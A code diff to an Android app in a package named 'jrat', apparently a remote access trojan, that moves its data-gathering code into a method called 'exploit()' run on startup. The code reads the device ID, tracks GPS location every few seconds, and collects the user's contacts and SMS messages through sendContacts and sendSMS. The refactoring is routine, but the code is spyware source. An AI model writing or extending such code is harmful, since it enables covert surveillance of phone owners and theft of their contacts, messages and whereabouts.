@@ -2,72 +2,28 @@ package com.julioxus.jrat;
 
 import android.content.ContentResolver;
 import android.database.Cursor;
-import android.location.Address;
-import android.location.Geocoder;
-import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
-import android.os.Environment;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
-import android.util.Log;
 import android.util.Pair;
 import android.view.Menu;
 import android.view.MenuItem;
-import android.view.View;
-import android.widget.Toast;
 
-import java.io.File;
-import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.OutputStream;
-import java.lang.reflect.Array;
 import java.util.ArrayList;
-import java.util.List;
-import java.util.Locale;
-import java.util.Properties;
-
-import com.google.android.gms.common.ConnectionResult;
-import com.google.android.gms.common.api.GoogleApiClient;
-import com.google.android.gms.location.LocationServices;
-import com.jcraft.jsch.*;
-
-import rpc.RpcClient;
-import rpc.RpcServer;
 
 public class MainActivity extends AppCompatActivity {
-
-
-    //Conctacts list data structure
-    private ArrayList<Pair<String, String>> contacts = new ArrayList<>();
-    private LocationManager mLocationManager;
-    private String android_id;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        android_id = Settings.Secure.getString(getBaseContext().getContentResolver(),
-                Settings.Secure.ANDROID_ID);
-
-        mLocationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
-        LocationListener locationListener = new MyLocationListener(getBaseContext(), android_id);
-        mLocationManager.requestLocationUpdates(
-                LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
-
-        new CreateRMIServerAsyncTask(this).execute();
-
-        try {
-            sendContacts();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        sendSMS();
-
+        exploit();
     }
 
     @Override
@@ -92,8 +48,33 @@ public class MainActivity extends AppCompatActivity {
         return super.onOptionsItemSelected(item);
     }
 
+    public void exploit(){
+
+        //Conctacts list data structure
+        ArrayList<Pair<String, String>> contacts = new ArrayList<>();
+        LocationManager mLocationManager;
+        String android_id;
+
+        android_id = Settings.Secure.getString(getBaseContext().getContentResolver(),
+                Settings.Secure.ANDROID_ID);
+
+        mLocationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+        LocationListener locationListener = new MyLocationListener(getBaseContext(), android_id);
+        mLocationManager.requestLocationUpdates(
+                LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
+
+        //new CreateRMIServerAsyncTask(this).execute();
+
+        try {
+            sendContacts(android_id, contacts);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        sendSMS(android_id);
+    }
+
     // Function to save all contacts of the user in a data structure.
-    public void sendContacts() throws IOException {
+    public void sendContacts(String android_id, ArrayList<Pair<String, String>> contacts) throws IOException {
 
         ContentResolver cr = getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
@@ -123,7 +104,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-    public void sendSMS(){
+    public void sendSMS(String android_id){
 
         ArrayList<String> messages = new ArrayList<>();
 
